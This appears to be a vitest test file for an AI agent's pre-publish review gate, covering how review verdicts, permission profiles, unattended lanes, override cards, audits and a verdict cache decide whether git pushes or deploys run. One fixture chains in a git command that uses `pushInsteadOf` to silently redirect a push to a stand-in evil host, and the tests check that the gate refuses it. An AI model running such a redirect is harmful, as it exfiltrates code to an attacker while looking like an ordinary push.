/**
 * The publish gate inside the approval phase: what each review outcome does
 * under each profile and lane, the RED override, the per-fingerprint verdict
 * cache, the tool-timeout exclusion, and the cheap path for calls that do not
 * publish. The change set and the review are faked at the gate's seams; the
 * real ones are pinned in publish-review/change-set.test.ts and
 * canonical-loop/publish-review-submit.test.ts.
 */
import { describe, it, expect, afterEach, afterAll, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const prevLaxDir = process.env.LAX_DATA_DIR;
const laxDir = mkdtempSync(join(tmpdir(), "lax-publish-gate-"));
process.env.LAX_DATA_DIR = laxDir;
afterAll(() => {
  if (prevLaxDir === undefined) delete process.env.LAX_DATA_DIR;
  else process.env.LAX_DATA_DIR = prevLaxDir;
  rmSync(laxDir, { recursive: true, force: true });
});

const lex = vi.hoisted(() => ({ calls: 0 }));
vi.mock("../security/layer/shell-command-positions.js", async (importOriginal) => {
  const original = await importOriginal<typeof import("../security/layer/shell-command-positions.js")>();
  return { ...original, commandPositions: (command: string) => { lex.calls++; return original.commandPositions(command); } };
});

const { requireApprovalPhase } = await import("./require-approval.js");
const { _setPublishGateDepsForTests, _resetPublishGateForTests, attachPublishReviewNote } = await import("./publish-review-gate.js");
const { setSessionProfile, clearSessionProfile } = await import("../autonomy/profile-store.js");
const { getApprovalManager } = await import("../approval-manager.js");
const { runInApprovalWaitScope, currentApprovalWaitMs } = await import("../approval-wait.js");
const { withTimeout } = await import("./tool-timeout.js");
const { getSharedAuditTrail } = await import("../threat/audit-trail.js");
type ToolCallContext = import("./context.js").ToolCallContext;
type CallContext = import("./context.js").CallContext;
type ServerEvent = import("../types.js").ServerEvent;
type ChangeSet = import("../publish-review/change-set-types.js").ChangeSet;
type PublishReviewRun = import("../canonical-loop/public/publish-review.js").PublishReviewRun;

let seq = 0;
const sessions: string[] = [];
function session(profile: Parameters<typeof setSessionProfile>[1]): string {
  const s = `publish-gate-${++seq}-${process.hrtime.bigint().toString(36)}`;
  setSessionProfile(s, profile);
  sessions.push(s);
  return s;
}

function changeSet(fingerprint: string, over: Partial<ChangeSet> = {}): ChangeSet {
  return {
    parts: [{
      kind: "git-push", label: "git push origin feature", repoRoot: "/repo",
      refs: [{ remoteRef: "refs/heads/feature", localRef: "refs/heads/feature", status: "new", newSha: "c".repeat(40) }],
      baseLabel: "origin/main", commits: [{ sha: "c".repeat(40), subject: "add digest" }], commitsTruncated: false,
      files: [{ status: "A", path: "supabase/migrations/0042.sql" }], fileDiffs: [], diffTruncated: false,
      includesWorkingTree: false, identity: fingerprint,
    }],
    unknown: [],
    fingerprint,
    ...over,
  };
}

const RED: PublishReviewRun = { opId: "op_review_publish_red", parsed: { ok: true, verdict: "RED", findings: [
  { severity: "red", location: "supabase/migrations/0042.sql:3", problem: "policy exposes every recipient's email", why: "cross-tenant PII leak; 0031 fixed this for sms", fix: "scope to auth.uid()" },
] } };
const AMBER: PublishReviewRun = { opId: "op_review_publish_amber", parsed: { ok: true, verdict: "AMBER", findings: [
  { severity: "amber", location: "src/dedupe.ts:40", problem: "24h check then insert is racy", why: "double sends", fix: "unique constraint" },
] } };
const GREEN: PublishReviewRun = { opId: "op_review_publish_green", parsed: { ok: true, verdict: "GREEN", findings: [] } };
const FAILED: PublishReviewRun = { opId: "op_review_publish_failed", parsed: { ok: false, reason: "the review ran past its 4-minute deadline and was cancelled" } };

interface Fake { reviews: number; changeSets: number; next: PublishReviewRun; fingerprint: string; set?: ChangeSet; delayMs?: number }
function fake(next: PublishReviewRun, fingerprint = `fp-${seq}`): Fake {
  const f: Fake = { reviews: 0, changeSets: 0, next, fingerprint };
  _setPublishGateDepsForTests({
    computeChangeSet: async () => { f.changeSets++; return f.set ?? changeSet(f.fingerprint); },
    runReview: async () => {
      f.reviews++;
      if (f.delayMs) await new Promise((r) => setTimeout(r, f.delayMs));
      return f.next;
    },
    recall: () => [],
    summarize: () => "1 commit, 1 file — git push origin feature from /repo",
  });
  return f;
}

function ctx(opts: { sessionId: string; callContext?: CallContext; command?: string; name?: string; args?: Record<string, unknown>; answer?: boolean | null; events?: ServerEvent[] }): ToolCallContext {
  const events = opts.events ?? [];
  return {
    tc: { id: `tc-${++seq}`, name: opts.name ?? "bash", arguments: "{}" },
    sessionId: opts.sessionId,
    callContext: opts.callContext ?? "local",
    args: opts.args ?? { command: opts.command ?? "git push origin feature", _cwd: "/repo" },
    onEvent: (e: ServerEvent) => {
      events.push(e);
      if (e.type === "approval_requested" && opts.answer !== null && opts.answer !== undefined) {
        getApprovalManager().resolveApproval(e.approvalId, opts.answer);
      }
    },
    approvalContext: "",
    riskLevel: "low",
    allowed: true,
    msgs: [],
  } as unknown as ToolCallContext;
}

const cards = (events: ServerEvent[]) => events.filter((e): e is Extract<ServerEvent, { type: "approval_requested" }> => e.type === "approval_requested");
const lastText = (c: ToolCallContext) => String(c.result?.content ?? "");

afterEach(() => {
  _setPublishGateDepsForTests(null);
  _resetPublishGateForTests();
  for (const s of sessions.splice(0)) { clearSessionProfile(s); getApprovalManager().clearSession(s); }
});

describe("calls that do not publish pay one cheap check", () => {
  it("a non-shell tool is never lexed and never reviewed", async () => {
    const f = fake(GREEN);
    lex.calls = 0;
    const outcome = await requireApprovalPhase(ctx({ sessionId: session("Power"), name: "read", args: { path: "a.txt" } }));
    expect(outcome.kind).toBe("continue");
    expect(lex.calls).toBe(0);
    expect(f.changeSets).toBe(0);
  });

  it("a shell command that does not publish computes no change set", async () => {
    const f = fake(GREEN);
    const events: ServerEvent[] = [];
    const c = ctx({ sessionId: session("Power"), command: "git log --oneline && grep -rn deploy src", events });
    expect((await requireApprovalPhase(c)).kind).toBe("continue");
    expect(f.changeSets).toBe(0);
    expect(c.publishReview).toBeUndefined();
    expect(events.filter((e) => e.type === "tool_progress")).toEqual([]);
  });
});

describe("AMBER / GREEN — the profile's publish row decides", () => {
  const ASKS = ["Safe", "Normal", "Developer"] as const;
  const RUNS = ["Power", "Autonomous"] as const;
  for (const [what, run] of [["GREEN", GREEN], ["AMBER", AMBER]] as const) {
    for (const profile of ASKS) {
      it(`${what} under ${profile}: asks, and the card carries the review`, async () => {
        fake(run);
        const events: ServerEvent[] = [];
        const c = ctx({ sessionId: session(profile), answer: true, events });
        expect((await requireApprovalPhase(c)).kind).toBe("continue");
        const [card] = cards(events);
        expect(card.context).toContain(`Pre-publish review: ${what}`);
        expect(card.preview).toMatchObject({ kind: "publish-review", status: what });
        expect(card.preview).not.toHaveProperty("overrideLabel");
        expect(c.publishReview?.status).toBe(what);
      });
    }
    for (const profile of RUNS) {
      it(`${what} under ${profile}: runs without a card, and the result says what the review found`, async () => {
        fake(run);
        const events: ServerEvent[] = [];
        const c = ctx({ sessionId: session(profile), events });
        expect((await requireApprovalPhase(c)).kind).toBe("continue");
        expect(cards(events)).toEqual([]);
        c.result = { content: "To github.com:acme/app.git\n * [new branch] feature -> feature" };
        attachPublishReviewNote(c);
        expect(lastText(c)).toMatch(new RegExp(`^\\[pre-publish review: ${what}`));
        if (what === "AMBER") expect(lastText(c)).toContain("src/dedupe.ts:40");
      });
    }
  }

  it("unattended + ask: blocked, and the block names the review", async () => {
    fake(AMBER);
    const c = ctx({ sessionId: session("Normal"), callContext: "cron" });
    expect((await requireApprovalPhase(c)).kind).toBe("halt");
    expect(lastText(c)).toContain("BLOCKED (unattended)");
    expect(lastText(c)).toContain("[pre-publish review: AMBER");
  });

  it("unattended + Autonomous + GREEN: runs", async () => {
    fake(GREEN);
    expect((await requireApprovalPhase(ctx({ sessionId: session("Autonomous"), callContext: "cron" }))).kind).toBe("continue");
  });

  it("a force-push is destructive AND reviewed: Power's irreversible floor asks, with the review on the card", async () => {
    fake(GREEN);
    const events: ServerEvent[] = [];
    const c = ctx({ sessionId: session("Power"), command: "git push --force origin feature", answer: true, events });
    expect((await requireApprovalPhase(c)).kind).toBe("continue");
    const [card] = cards(events);
    expect(card.context).toMatch(/Irreversible operation \(git force-push\).*Pre-publish review: GREEN/);
  });
});

// The owner's rule (2026-09-28, after a live UNKNOWN under Power let a push
// out unreviewed): "even autonomous users don't want unreviewed pushes."
describe("FAILED / UNKNOWN — nothing ships unreviewed without the user's yes, in any profile", () => {
  it("FAILED under Autonomous: an always-ask 'Push unreviewed' card; yes runs it and is audited as unreviewed", async () => {
    fake(FAILED);
    const events: ServerEvent[] = [];
    const s = session("Autonomous");
    const c = ctx({ sessionId: s, answer: true, events });
    expect((await requireApprovalPhase(c)).kind).toBe("continue");
    const [card] = cards(events);
    expect(card.rememberable).toBe(false);
    expect(card.context).toContain("Nothing was reviewed");
    expect(card.context).toContain("Push unreviewed");
    expect(card.preview).toMatchObject({ kind: "publish-review", status: "FAILED", overrideLabel: "Push unreviewed" });
    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
    expect(audit?.reason).toContain("could not run (FAILED: the review ran past its 4-minute deadline");
    c.result = { content: "pushed" };
    attachPublishReviewNote(c);
    expect(lastText(c)).toContain("This publish was NOT reviewed");
  });

  it("an unknown change set under Power: no review runs, the card says so, and no means NOT RUN", async () => {
    const f = fake(GREEN);
    f.set = changeSet("fp-unknown", { parts: [], unknown: [{ label: "vercel --prod", cwd: "/site", reason: "/site is not inside a git repository" }] });
    const events: ServerEvent[] = [];
    const c = ctx({ sessionId: session("Power"), command: "vercel --prod", answer: false, events });
    expect((await requireApprovalPhase(c)).kind).toBe("halt");
    expect(f.reviews).toBe(0);
    const [card] = cards(events);
    expect(card.context).toContain("UNKNOWN — what would ship could not be determined, so NOTHING was reviewed");
    expect(card.preview).toMatchObject({ status: "UNKNOWN", overrideLabel: "Deploy unreviewed" });
    expect(c.result?.status).toBe("declined");
    expect(lastText(c)).toContain("NOT RUN: vercel --prod was stopped because the pre-publish review could not run");
    expect(lastText(c)).toContain("/site is not inside a git repository");
    expect(lastText(c)).toContain("Do not publish by another route");
  });

  for (const lane of ["cron", "delegated", "api"] as const) {
    it(`${lane} + Autonomous + FAILED: blocked, no card, no override`, async () => {
      fake(FAILED);
      const events: ServerEvent[] = [];
      const c = ctx({ sessionId: session("Autonomous"), callContext: lane, events });
      expect((await requireApprovalPhase(c)).kind).toBe("halt");
      expect(cards(events)).toEqual([]);
      expect(c.result?.status).toBe("blocked");
      expect(lastText(c)).toContain("could not run");
      expect(lastText(c)).toContain("unattended run, so nobody can override it");
    });
  }
});

// `git push origin feature && git -c url.<evil>.pushInsteadOf=<good> push <good>
// main`: the first push is reviewed, the second is refused by the dry run. A
// verdict on the first must not carry the second out without the user's yes.
describe("a publish that could not be reviewed rides along with one that was", () => {
  const SECOND = "git push https://good.invalid/r main";
  const COMMAND = `git push origin feature && git -c url.https://evil.invalid/.pushInsteadOf=https://good.invalid/ push https://good.invalid/r main`;
  const REFUSED = "the command sets git config url.*.pushinsteadof (-c) for the push, which can change where it connects, what it sends or what it runs, and the review cannot apply it; not run before approval";
  const partial = (next: PublishReviewRun): Fake => {
    const f = fake(next);
    f.set = changeSet(`fp-partial-${seq}`, { unknown: [{ label: SECOND, cwd: "/repo", reason: REFUSED }] });
    return f;
  };

  for (const [what, run] of [["GREEN", GREEN], ["AMBER", AMBER]] as const) {
    it(`${what} on the first under Autonomous: an always-ask 'Push unreviewed' card naming the second; no means NOT RUN`, async () => {
      const f = partial(run);
      const events: ServerEvent[] = [];
      const c = ctx({ sessionId: session("Autonomous"), command: COMMAND, answer: false, events });
      expect((await requireApprovalPhase(c)).kind).toBe("halt");
      expect(f.reviews).toBe(1);
      const [card] = cards(events);
      expect(card.rememberable).toBe(false);
      expect(card.context).toContain(`Part of what this call publishes was not reviewed: ${SECOND}`);
      expect(card.context).toContain(`The rest: ${what}`);
      expect(card.preview).toMatchObject({ status: what, overrideLabel: "Push unreviewed", unknown: [{ label: SECOND, reason: REFUSED }] });
      expect(c.result?.status).toBe("declined");
      expect(lastText(c)).toContain(`part of what it publishes could not be reviewed: ${SECOND}`);
      expect(lastText(c)).toContain("Do not publish by another route");
    });
  }

  it("yes runs it, and the audit says which part went out unreviewed", async () => {
    partial(GREEN);
    const s = session("Power");
    const c = ctx({ sessionId: s, command: COMMAND, answer: true });
    expect((await requireApprovalPhase(c)).kind).toBe("continue");
    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
    expect(audit?.reason).toContain(`although part of it could not be reviewed (${SECOND}: ${REFUSED}; the rest was GREEN)`);
  });

  it("over a RED verdict on the first, the audit also records the unreviewed second", async () => {
    partial(RED);
    const s = session("Power");
    expect((await requireApprovalPhase(ctx({ sessionId: s, command: COMMAND, answer: true }))).kind).toBe("continue");
    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
    expect(audit?.reason).toContain(`over a RED pre-publish review, with part of it not reviewed (${SECOND}: ${REFUSED})`);
  });

  it("unattended + Autonomous: blocked, no card", async () => {
    partial(GREEN);
    const events: ServerEvent[] = [];
    const c = ctx({ sessionId: session("Autonomous"), callContext: "cron", command: COMMAND, events });
    expect((await requireApprovalPhase(c)).kind).toBe("halt");
    expect(cards(events)).toEqual([]);
    expect(lastText(c)).toContain("unattended run, so nobody can override it");
  });
});

describe("RED — blocked unless the user overrides", () => {
  it("interactive: an always-ask 'Push anyway' card with the findings; yes runs it and is audited", async () => {
    fake(RED);
    const events: ServerEvent[] = [];
    const s = session("Autonomous"); // even the most permissive profile asks
    const c = ctx({ sessionId: s, answer: true, events });
    expect((await requireApprovalPhase(c)).kind).toBe("continue");
    const [card] = cards(events);
    expect(card.rememberable).toBe(false);
    expect(card.preview).toMatchObject({ kind: "publish-review", status: "RED", overrideLabel: "Push anyway", findings: [expect.objectContaining({ severity: "red" })] });
    expect(card.context).toContain("Push anyway");
    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
    expect(audit?.reason).toContain("policy exposes every recipient's email");
  });

  it("interactive: no means NOT RUN, and the model gets the findings to fix", async () => {
    fake(RED);
    const c = ctx({ sessionId: session("Power"), answer: false });
    expect((await requireApprovalPhase(c)).kind).toBe("halt");
    expect(c.result?.status).toBe("declined");
    expect(lastText(c)).toContain("NOT RUN: git push origin feature was stopped by the pre-publish review (verdict RED)");
    expect(lastText(c)).toContain("supabase/migrations/0042.sql:3");
    expect(lastText(c)).toContain("Fix every red finding");
  });

  for (const lane of ["cron", "delegated", "api"] as const) {
    it(`${lane}: blocked with the findings, no card, no override`, async () => {
      fake(RED);
      const events: ServerEvent[] = [];
      const c = ctx({ sessionId: session("Autonomous"), callContext: lane, events });
      expect((await requireApprovalPhase(c)).kind).toBe("halt");
      expect(cards(events)).toEqual([]);
      expect(c.result?.status).toBe("blocked");
      expect(lastText(c)).toContain("unattended run, so nobody can override it");
    });
  }
});

describe("verdict cache — per (session, fingerprint)", () => {
  it("the same change set reuses the verdict: a retry after an override is not re-reviewed", async () => {
    const f = fake(RED, "fp-same");
    const s = session("Power");
    await requireApprovalPhase(ctx({ sessionId: s, answer: true }));
    const events: ServerEvent[] = [];
    const again = ctx({ sessionId: s, command: "git push origin feature ", answer: false, events });
    expect((await requireApprovalPhase(again)).kind).toBe("halt");
    expect(f.reviews).toBe(1);
    expect(cards(events)).toHaveLength(1); // still asked — an override is per publish
  });

  it("a changed diff is a new fingerprint and a new review", async () => {
    const f = fake(GREEN, "fp-a");
    const s = session("Power");
    await requireApprovalPhase(ctx({ sessionId: s }));
    f.fingerprint = "fp-b";
    await requireApprovalPhase(ctx({ sessionId: s }));
    expect(f.reviews).toBe(2);
  });

  it("another session does not inherit the verdict", async () => {
    const f = fake(GREEN, "fp-shared");
    await requireApprovalPhase(ctx({ sessionId: session("Power") }));
    await requireApprovalPhase(ctx({ sessionId: session("Power") }));
    expect(f.reviews).toBe(2);
  });

  it("identical concurrent publishes share one review", async () => {
    const f = fake(GREEN, "fp-concurrent");
    f.delayMs = 30;
    const s = session("Power");
    await Promise.all([requireApprovalPhase(ctx({ sessionId: s })), requireApprovalPhase(ctx({ sessionId: s }))]);
    expect(f.reviews).toBe(1);
  });

  it("a FAILED review is not a verdict: the next attempt reviews again", async () => {
    const f = fake(FAILED, "fp-failed");
    const s = session("Power");
    await requireApprovalPhase(ctx({ sessionId: s, answer: false }));
    f.next = GREEN;
    const c = ctx({ sessionId: s });
    await requireApprovalPhase(c);
    expect(f.reviews).toBe(2);
    expect(c.publishReview?.status).toBe("GREEN");
  });
});

describe("the review wait is not the tool's time", () => {
  it("a review longer than the enclosing tool timeout does not time the call out", async () => {
    const f = fake(GREEN);
    f.delayMs = 200;
    const c = ctx({ sessionId: session("Power") });
    const outcome = await runInApprovalWaitScope(() => withTimeout(requireApprovalPhase(c), 50, "bash", currentApprovalWaitMs));
    expect(outcome.kind).toBe("continue");
  });

  it("reports progress on the publish call while it waits", async () => {
    fake(GREEN);
    const events: ServerEvent[] = [];
    await requireApprovalPhase(ctx({ sessionId: session("Power"), events }));
    const lines = events.filter((e) => e.type === "tool_progress").map((e) => (e as { message: string }).message);
    expect(lines[0]).toMatch(/Working out exactly what git push origin feature would ship/);
    expect(lines).toContain("Pre-publish review: GREEN");
  });
});
